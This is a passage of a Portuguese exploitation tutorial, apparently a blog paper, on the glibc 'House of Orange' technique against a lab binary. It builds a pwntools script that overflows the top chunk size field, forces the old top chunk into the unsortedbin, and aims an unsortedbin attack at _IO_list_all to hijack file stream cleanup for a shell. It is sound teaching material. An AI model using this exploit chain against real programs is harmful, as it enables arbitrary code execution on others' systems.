<p>Nas técnicas de <em>unsafe unlink</em> e <em>safe unlink</em> vimos a macro e função utilizadas no processo de <em>unlinking</em>, mas neste caso, a malloc não precisa utilizar estes recursos, pois a malloc não só sabe qual o <em>bin</em> o <em>chunk</em> que passou pelo o <em>sort</em> ou foi alocado está quando foi desvinculado, como sua própria posição posição, neste caso, o processo de <em>unlinking</em> pode ser simplificado para algo chamado <em>partial unlink</em>.</p>

<p>O processo abaixo, exemplifica de forma abstrata o processo de <em>partial unlink</em></p>

<p><img src="/img/papers/heap_p1/paper_heap1_241.png" alt="Processo de partial unlink" /></p>

<p>O “fd” do <em>chunk</em> vítima sempre será ignorado, pois ele sempre vai apontar para o topo do <em>unsortedbin</em> uma vez que também sempre será o último <em>chunk</em> da lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_242.png" alt="Processo de partial unlink" /></p>

<p>O “bk” do <em>chunk</em> vítima é seguido e o endereço do <em>unsortedbin</em> é copiado sobre o “fd” do <em>chunk</em> encontrado, o que é suficiente para remover o <em>chunk</em> vítima da lista “fd”. O <em>chunk</em> vítima é removido da lista “bk” após copiar seu “bk” sobre o “bk” do <em>unsortedbin</em>.</p>

<p>Do ponto de vista da exploração, o processo de <em>partial unlink</em> nos interassa, é porque este processo não passa por nenhuma checagem de integridade, e isto forma a base do <em>unsortedbin attack</em>.</p>

<blockquote>
  <p>A premissa é simplesmente nos aproveitarmos de um <em>bug</em> para adulterar o “bk” de um <em>chunk</em> do <em>unsortedbin</em> e então ativar o processo de <em>partial unlink</em>. O resultado disso, é que podemos sobrescrever o endereço do <em>unsortedbin</em> para o endereço que quisermos, podendo vazer endereços da arena, ou no caso da técnica <code class="language-plaintext highlighter-rouge">The House od Orange</code>, conseguirmos um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<h2 id="fase-1---top-chunk-extension">Fase 1 - Top Chunk Extension</h2>

<p>Esta fase, pode ser utilizada ou não, dependendo do <em>bug</em> encontrado no programa, porém, conforme descrito no arigo <code class="language-plaintext highlighter-rouge">HITCON CTF Qual 2016: House of Orange Write up</code>, neste exemplo vamos explorar a técnica completa.</p>

<p>No diretório <code class="language-plaintext highlighter-rouge">house_of_force</code> existe um binário com o mesmo nome, do qual podemos checar suas implementações de segurança com o programa <code class="language-plaintext highlighter-rouge">checksec</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_243.png" alt="Implementações do programa" /></p>

<p>Conforme podemos observar, este binário foi compilado com as principais técnicas de mitigação de exploração, <code class="language-plaintext highlighter-rouge">Full RELRO</code>, <code class="language-plaintext highlighter-rouge">Stack Canary</code>, <code class="language-plaintext highlighter-rouge">NX</code> e <code class="language-plaintext highlighter-rouge">PIE protector</code>, além de utilizar a GLIBC na versão 2.23.</p>

<p>A fase um, depende de qual tipo de <em>bug</em> está presente no binário, portanto, podemos enumerá-lo em tempo de execução através do GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_244.png" alt="Carregando o programa no GDB" /></p>

<p>Desta vez, podemos ver os vazamentos de endereço, e o menu com algumas diferenças. Neste binário, podemos solicitar dois <em>small chunks</em> na opção um do menu. Porém, quando solicitamos estes <em>chunks</em> o programa não solicita os dados para preenchê-lo, confomre imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_245.png" alt="Alocando small chunks" /></p>

<p>Pausando a execução no GDB e inspecionando a <em>heap</em>, podemos ver que o programa aloca <em>chunks</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x20</code> bytes com a opção um do menu, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_246.png" alt="Chunks alocados" /></p>

<p>Continuando a execução, na opção dois, podemos solicitar um <em>large chunk</em>. Assim como na opção um, podemos pausar a execução no GDB, e inspecionar o que o programa considera como <em>large</em>. Na imagem abaixo podemos verificar que o programa considera para um <em>large chunk</em> o tamanho de <code class="language-plaintext highlighter-rouge">0xfd0</code> bytes.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_247.png" alt="Chunks alocados" /></p>

<p>Por último, a opção três do menu, nos permite editar específicamente o conteúdo do primeiro <em>small chunk</em> alocado. Podemos preenchê-lo com lixo e inspecionar a <em>heap</em>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_248.png" alt="Primeiro small chunk preenchido" /></p>

<p>Continuando a enumeração, podemos comprovar que o binário possui um <em>bug</em> de <em>heap overflow</em> quando utilizamos a opção <em>edit</em> e enviamos mais dados que um <em>small chunk</em> suporta, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_249.png" alt="Heap overflow" /></p>

<p>Ao inspecionar a <em>heap</em> podemos ver que sobrescrevemos o <em>top chunk size field</em> do segundo <em>small chunk</em>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_250.png" alt="Heap overflow" /></p>

<blockquote>
  <p>Este bug nos mostra que podemos adulterar o <em>top chunk size field</em> nos dois <em>chunks</em> seguintes, porém este <em>bug</em> não significa nada se não encontrarmos uma forma de fazer com que a malloc utilize os dados forjados de alguma forma, pois a única coisa que a malloc pode fazer com um <em>chunk</em> alocado, é liberá-lo.</p>
</blockquote>

<p>Conforme vimos na fase 2 da técnica, iremos utilizar o <em>unsortedbin attack</em>, esta técnica ocorre durante a liberação de um <em>chunk unsorted</em>, porém, no menu do programa não existe a opção <em>free</em>, logo não temos acesso à execução da função <code class="language-plaintext highlighter-rouge">free()</code>.</p>

<p>Precisamos de uma forma de usar o <em>bug</em> de <em>overflow</em> para gerar um <em>chunk</em> livre apenas utilizando chamadas para a função <code class="language-plaintext highlighter-rouge">malloc()</code>. Isto é o que iremos fazer na fase 1 da técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code>.</p>

<p>Na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code> nós sobrescrevemos o <em>top chunk size field</em> com um valor muito grande e vimos o comportamento da malloc nesta situação. Porém, se sobrescrevermos este campo com um valor muito pequeno, a malloc terá um comportamento diferente.</p>

<p>O exemplo abaixo, mostra de forma abstrata o comportamento da malloc quando alteramos o <em>top chunk size field</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_251.png" alt="Aumentando um top chunk size field" /></p>

<p>Quando temos um <em>chunk</em> gerado pela <em>main arena</em> e solicitamos um tamanho maior, como fizemos na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>, a malloc invoca a <em>syscall</em> <code class="language-plaintext highlighter-rouge">brk()</code> para requisitar mais memória do kernal. A malloc utiliza o <em>top chunk size field</em> atual para determinar se a nova memória será adjacente ao final da <em>heap</em>. Se sim, a malloc extende o <em>top chunk</em> até o endereço da memória adicional requisitada e permite a alocação de um <em>top chunk</em> maior, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_252.png" alt="Aumentando um top chunk size field" /></p>

<p>Agora, podemos verificar este mesmo processo, quando solicitamos mais memória após sobrescrevemos o <em>top chunk size field</em> com um valor menor.<br />
A malloc também vai solicitar mais memória através da <em>syscall</em> <code class="language-plaintext highlighter-rouge">brk()</code>, porém, a nova memória não será adjacente ao <em>top chunk</em> original, criando um <em>gap</em> entre os dois, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_253.png" alt="Aumentando um top chunk size field" /></p>

<p>Quando isso ocorre, a malloc entende que o kernel é incapaz de mapear a memória contínua para esta <em>heap</em>, pois talvez estaja fora do espaço válido. E, uma vez que a nova memória é maior que a anterior, a malloc considera que que a nova <em>heap</em> se inicia na nova memória, e ela faz isso configurando o <em>top chunk pointer</em> na <em>main arena</em> como sendo o endereço da nova memória. E para não desperdiçar espaço a malloc libera o <em>top chunk</em> antigo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_254.png" alt="Liberando o top chunk antigo" /></p>

<p>Então, se utilizarmos de <em>overflow</em> para diminuir o tamanho do <em>top chunk</em>, e em seguida, fazer uma requisição maior que o permitido por este <em>top chunk</em> adulterado, a malloc irá gerar um <em>chunk</em> livre, que pode ser utilizado em nosso <em>unsortedbin attack</em>, e todo este processo ocorrerá sem invocar a função <code class="language-plaintext highlighter-rouge">free()</code>.<br />
Esta é a fase 1 da técnica <code class="language-plaintext highlighter-rouge">The House of orange</code>.</p>

<h2 id="obtendo-um-shell">Obtendo um Shell</h2>

<p>Para iniciarmos e organizarmos os passos descritos anteriormente, vamos criar o script inicial <code class="language-plaintext highlighter-rouge">shell.py</code> que ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"house_of_orange"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> <span class="c1"># elf.libc broke again
</span>
<span class="c1"># GDB config em _IO_fhlush_all_lockp
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># selecionando a opcao "malloc (small)"
</span><span class="k">def</span> <span class="nf">small_malloc</span><span class="p">():</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># selecionando a opcao "malloc (large)"
</span><span class="k">def</span> <span class="nf">large_malloc</span><span class="p">():</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendthen</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>

<span class="c1"># selecionando a opcao "edit (1st small chunk)" e enviando os dados
</span><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># capturando o endereco da heap que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"heap @ "</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1">#===============EXPLOITING================#
</span>
<span class="c1">#=========================================#
</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Conforme os scripts anteriores, temos funções auxiliares para iterarmos nas opções do menu do programa, além de um <em>breakpoint</em> configurado no GDB, para utilizarmos posteriormente.</p>

<p>Sabendo que o <em>small chunk</em> aloca um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes no <em>user data</em>, podemos solicitar o primeiro <em>chunk</em> e preenchê-lo com 24 bytes e tudo que enviarmos após isto, irá sobrescrever o <em>top chunk size field</em>.<br />
Vamos sobrescrever o <em>top chunk size field</em> com o valor de <code class="language-plaintext highlighter-rouge">0x90</code> bytes, desta forma, quando ele for liberado, também será vinculado ao <em>unsortedbin</em>. Adicionando estas linhas no script, ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com estas atualizações, podemos executar o script com as opções do GDB e requisitar um <em>large chunk</em> para ativar o <em>top chunk extension</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_255.png" alt="Mensagem de erro" /></p>

<p>Conforme podemos ver, o programa respondeu com uma mensagem de erro. Voltando ao GDB, podemos visualizar o código fonte que gerou este erro, alterando o contexto para o <em>frame</em> 3, <code class="language-plaintext highlighter-rouge">sysmalloc()</code>. Esta função é responsável por requisitar memória do kernel. Conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_256.png" alt="Código do erro" /></p>

<p>Conforme na imagem, o erro foi ativado pelas duas linhas de código circuladas em vermelho. A primeira, checa se a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> foi configurada no <em>top chunk</em>, uma vez que o <em>top chunk</em> sempre terá esta <em>flag</em> configurada, ela ativou o erro. A segunda linha checa se o <em>top chunk</em> termina no limite de uma página, o que atualmente não atende.</p>

<blockquote>
  <p>No contexto de memória, uma página ou <em>page</em> tem o tamanho padrão de 4096 bytes, ou <code class="language-plaintext highlighter-rouge">0x1000</code> bytes.</p>
</blockquote>

<p>Após analisarmos o código que causou o erro, podemos alterar nossa linha de edição do <em>chunk</em>. Precisamos configurar o <em>top chunk size field</em> para um valor que alinhe o <em>top chunk</em> ao limite de uma página, podemos fazer isto, subtraindo os <code class="language-plaintext highlighter-rouge">0x20</code> bytes que já alocamos do tamanho padrão de <code class="language-plaintext highlighter-rouge">0x1000</code> bytes de uma página. Também precisamos adicionar 1 byte para configurar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>.<br />
Estas configurações devem atender as checagens da <code class="language-plaintext highlighter-rouge">sysmalloc()</code> e podemos já inserir a requisição para um <em>large chunk</em> no script para ativar o <em>top chunk extension</em>, ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="c1"># ativando o top chunk extension
</span><span class="n">large_malloc</span><span class="p">()</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Executando o script com as opções do GDB, desta vez o programa não quebrou, inspecionando a <em>heap</em>, podemos ver que agora há um <em>chunk</em> livre no <em>unsortedbin</em>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_257.png" alt="Free chunk" /></p>

<p>Agora que a fase 1 está completa, estamos aptos a sobrescrever o “bk” do <em>top chunk</em> antigo, e ativarmos o <em>unsortedbin attack</em>. No entanto, sabendo que o <em>unsortedbin attack</em> redireciona a execução do programa para a direção que apontarmos, precisamos encontrar uma forma de ligar as fases 2 e 3 fazendo um link entre o <em>unsortedbin attack</em> e o <em>file stream exploitation</em>.</p>

<p>Vimos anteriormente como o <em>vtable highjacking</em> se comporta na técnica <em>file stream exploitation</em>.<br />
Tabmém vimos que o <code class="language-plaintext highlighter-rouge">_IO_list_all</code> é o topo de uma lista que contém todos os <em>file streams</em> que os processos do programa abriram e são usados quando a GLIBC precisa executar uma operação em todos os <em>file streams</em> abertos, normamlente para limpar os procedimentos.</p>

<p>Um destes processos de limpeza de procedimentos, acontece quando um programa finaliza, através da função <code class="language-plaintext highlighter-rouge">exit()</code> da GLIBC, ou retornando para a função <code class="language-plaintext highlighter-rouge">main()</code> do programa.</p>

<p>Supondo que apontemos nosso <em>unsortedbin attack</em> para o <code class="language-plaintext highlighter-rouge">_IO_list_all</code>, o substituindo com <em>pointer</em> para a <em>main arena</em>, então mandamos o sinal para sair do programa. Quando o programa finaliza e a GLIBC limpa todos os processos, isso causará uma tentativa de limpar todos os <em>file streams</em> abertos. Ela fará isso iterando sobre todos os <em>file streams</em> contidos na <code class="language-plaintext highlighter-rouge">_IO_list_all</code>, determinando se esta lista precisa ser limpa, e, se sim, chamando um uma função chamada <code class="language-plaintext highlighter-rouge">overflow()</code> sobre este <em>file stream</em>.</p>

<p>Neste momento a <em>main arena</em> será tratada como um <em>file stream</em> nos dando a oportunidade de apontar um dos campos do <em>stream</em> para a memória <em>heap</em> que nós controlamos.<br />
Podemos fazer isso, invocando o processo de <em>sorting</em> no <em>top chunk</em> antigo para um <em>bin</em> de nossa escolha, afinal, nós controlamos seu <em>size field</em> através do <em>bug</em> de <em>overflow</em>. E se requisitarmos um <em>chunk</em> de tamanho maior, ele passará pelo processo de <em>sorting</em>, ao invés de ser alocado.<br />
Mesmo o <em>chunk</em> não sendo alocado, o ataque ainda terá sucesso, pois conforme vimos anteriormente, o processo de <em>sorting</em> envolve o <em>partial unlink</em>.</p>

<p>Para organizarmos os passos citados e criarmos uma prova de conceito, podemos adicionar estes passos para preparar nosso <em>unsortedbin attack</em> contra o <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_IO_list_all</code>. Utilizando a função auxiliar <code class="language-plaintext highlighter-rouge">edit()</code>, podemos sobrescrever pela segunda vez o <em>top chunk size field</em> do <em>chunk</em> antigo com o valor de <code class="language-plaintext highlighter-rouge">0x21</code> bytes, seu “fd” para qualquer valor (<em>partial unlink</em> ignora o “fd”, conforme já vimos) e seu “bk” para o endereço da <code class="language-plaintext highlighter-rouge">_IO_list_all - 16</code>. Fazendo isto criaremos o cenário onde haverá um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes no <em>unsortedbin</em> cujo seu “bk” aponta para um endereço próximo ao <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.</p>

<p>Por fim, vamos adicionar uma chamada para criação de um <em>small chunk</em>, isso fará com que a malloc aloque o <em>top chunk</em> antigo, uma vez que setamos seu tamanho para <code class="language-plaintext highlighter-rouge">0x20</code> bytes, ativando nosso <em>unsortedbin attack</em> contra a <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.</p>

<blockquote>
  <p>Na descrição dos passos, foi descrito que solicitaríamos um <em>chunk</em> de tamanho maior que o <em>top chunk</em> antigo fazendo que ele sofresse o processo de <em>partial unlink</em> ao invés de ser alocado. Porém, para efetivar a prova de conceito, vamos alocá-lo e medir seu comportamento.</p>
</blockquote>

<p>O bloco de exploração do script, fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="c1"># ativando o top chunk extension
</span><span class="n">large_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o top chunk antigo apontando sua "bk" para _IO_list_all - 16
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_list_all</span> <span class="o">-</span> <span class="mi">16</span><span class="p">))</span>

<span class="c1"># requisitando um small chunk para realocar o top chunk antigo
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com o script atualizado, podemos executá-lo com as opções do GDB e inspecionar o <code class="language-plaintext highlighter-rouge">_IO_list_all</code> com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_258.png" alt="Pointer do _IO_list_all" /></p>

<p>Podemos ver pela imagem, que a <code class="language-plaintext highlighter-rouge">_IO_list_all</code> aponta para a <em>main arena</em>. Vamos continuar a execução do programa, e ver o comportamento da malloc com este <em>pointer</em> ao selecionarmos a opção quatro do menu do programa que envia o sinal <code class="language-plaintext highlighter-rouge">exit()</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_259.png" alt="Saindo do programa" /></p>

<p>Voltando ao GDB, vemos que o programa parou no <em>breakpoint</em> confiogurado no script, na função da GLIBC responsável por limpar os <em>file streams</em> durante a o processo de encerramento do programa. O painel <em>backtrace</em> nos mostra que esta função se chama <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_260.png" alt="_IO_flush_all_lockp()" /></p>

<p>Esta função foi chamada atraves da <code class="language-plaintext highlighter-rouge">_IO_cleanup()</code>. Se continuarmos a execução do programa, receberemos o sinal <code class="language-plaintext highlighter-rouge">sigfault</code> e o painel <em>source</em> nos mostra o código responsável pelo erro, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_261.png" alt="Código do erro" /></p>

<p>Neste caso, o motivo do erro é irrelevante, pois esta função está tentando tratar a <em>main arena</em> como um <em>file stream</em>. O importante é entender como esta checagem funciona.</p>

<p>A linha contendo <code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code> ressaltada na imagem abaixo, é a que chama a função <code class="language-plaintext highlighter-rouge">overflow()</code> citada anteriormente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_262.png" alt="_IO_OVERFLOW" /></p>

<p>Seu primeiro argumento, “fp”, representa o <em>file stream</em> de onde a <code class="language-plaintext highlighter-rouge">overflow()</code> está sendo chamada. Existem duas checagens necessárias para esta linha ser executada. A primeira checagem passa se o campo <code class="language-plaintext highlighter-rouge">_mode</code> do <em>file stream</em> for menor ou igual a zero e o seu <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> for maior que seu campo <code class="language-plaintext highlighter-rouge">_IO_write_base</code>, conforme ressaltado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_263.png" alt="Checagens" /></p>

<p>Basicamente, esta linha de código checa se existe qualquer coisa para ser escrito neste <em>file stream</em> antes do programa sair.</p>

<p>A segunda checagem, verifica se o campo <code class="language-plaintext highlighter-rouge">_mode</code> é maior que zero, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_264.png" alt="Checagens" /></p>

<p>Podemos visualizar as coisas na perspectiva da função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> no GDB com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_265.png" alt="Pointers do file stream" /></p>

<p>Conforme podemos observar, o <em>file stream</em> que parece sobrescrever a <em>main arena</em> possui o campo <code class="language-plaintext highlighter-rouge">_mode</code> negativo, ressaltado em vermelho, mas seus campos <code class="language-plaintext highlighter-rouge">_IO_write_base</code> e <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> são iguais, ilustrado em verde, fazendo com que a primeira linha da checagem falhe. Desta forma a <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> não irá chamar a função <code class="language-plaintext highlighter-rouge">overflow()</code>, ao invés disso, vai passar para o próximo <em>stream</em> através do <em>pointer</em> do <code class="language-plaintext highlighter-rouge">_chain</code>, que neste momento aponta para a <em>main arena</em>, ilustrado em azul.</p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">dq</code> para fazer o <em>dump</em> de 26 <em>quadwords</em> da <em>main arena</em>, podemos determinar qual parte da <em>main arena</em> está sendo considerada como o <em>pointer</em> do <code class="language-plaintext highlighter-rouge">_chain</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_266.png" alt="Campos na main arena" /></p>

<p>Ao observamos a imagem, podemos ver o local onde a <em>main arena</em> armazena o <em>top chunk pointer</em>, marcado em verde, o local onde armazena o “fd” e “bk” do <em>unsortedbin</em> em azul, e, maracado em vermelho, podemos ver os “bk” do <em>smallbins</em> em incrementos de 16 bytes.</p>

<p>Se compararmos o endereço dos <em>smallbins</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes, podemos ver que o campo <code class="language-plaintext highlighter-rouge">_chain</code> aponta exatamente para ele, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_267.png" alt="Pointer do _chain" /></p>

<p>Isso significa que se alterarmos o <em>size field</em> do <em>chunk</em> antigo de <code class="language-plaintext highlighter-rouge">0x21</code> para <code class="language-plaintext highlighter-rouge">0x61</code> antes do nosso <em>unsortedbin attack</em>, o <em>top chunk</em>  antigo, sofrerá o processo de <em>sorting</em> no <em>smallbin</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes, ao invés de ser alocado, e terminar no <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_chain</code> sobreponto a <em>main arena</em>.</p>

<p>Isto nos permite forjar nosso próprio <em>file stream</em> falso na <em>heap</em>, nos dando nosso próprio <em>pointer</em> para a <em>vtable</em> e nossas próprias entradas desta <em>vtable</em> forjada.</p>

<p>Neste ponto, nossa prova de conceito foi efetivada, porém, vamos atualizar nosso script, a fim de nos aproveitarmos destas alterações e obter um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Para fins de organização e melhor entendimento, vamos separar os <em>pointers</em> em variáveis no script, seguindo os seguintes passos:</p>

<ol>
  <li>Primeiro, temos que alterar o <em>size field</em> do <em>chunk</em> antigo para o tamanho de <code class="language-plaintext highlighter-rouge">0x61</code> bytes, conforme comprovamos na prova de conceito.</li>
  <li>O campo “fd” pode ter qualquer valor, pois será desconsiderado no processo.</li>
  <li>Continuaremos apontando seu “bk” para o endereço da <code class="language-plaintext highlighter-rouge">_IO_list_all - 16</code>. Pois quando nosso <em>exploit</em> ativar a função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, ela seguirá o <em>pointer</em> do <code class="language-plaintext highlighter-rouge">_IO_list_all</code> forjado até a <em>main arena</em> que irá falhar, então ela seguirá para o próximo <em>file stream</em> através do campo <code class="language-plaintext highlighter-rouge">_chain</code> que por sua vez, estará apontando para o “bk” do <em>smallbin</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes. O <em>top chunk</em> antigo passará pelo processo de <em>unsorting</em> nesta posição durante o <em>unsortedbin attack</em> fazendo com que a função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> siga o <code class="language-plaintext highlighter-rouge">_chain</code> até a <em>heap</em>, onde nosso <em>file stram</em> falso está, executando sua checagem e chamando a função <code class="language-plaintext highlighter-rouge">overflow()</code>. Para que tudo isso ocorra, precisamos nos certificar de que nosso <em>file stream</em> falso passe pelas checagens da malloc e crie um <em>pointer</em> para uma <em>vtable</em> na qual a entrada da <code class="language-plaintext highlighter-rouge">overflow()</code> esteja populada com a função que queremos executar.</li>
